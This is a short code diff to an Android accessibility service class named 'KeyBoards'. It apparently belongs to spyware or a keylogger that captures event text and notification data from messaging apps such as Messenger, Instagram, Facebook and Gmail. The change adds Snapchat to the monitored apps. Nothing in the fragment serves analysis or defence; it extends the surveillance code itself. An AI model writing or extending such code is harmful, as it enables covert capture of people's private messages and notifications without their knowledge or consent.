@@ -87,7 +87,8 @@ public class KeyBoards extends AccessibilityService {
                             event.getPackageName().equals("com.facebook.orca") ||
                             event.getPackageName().equals("com.instagram.android") ||
                             event.getPackageName().equals("com.facebook.katana")||
-                            event.getPackageName().equals("com.google.android.gm")) {
+                            event.getPackageName().equals("com.google.android.gm")||
+                            event.getPackageName().equals("com.snapchat.android")) {
                         System.out.println("SERVICE : " + eventText + "");
                         Parcelable data = event.getParcelableData();
                         if (data instanceof android.app.Notification) {
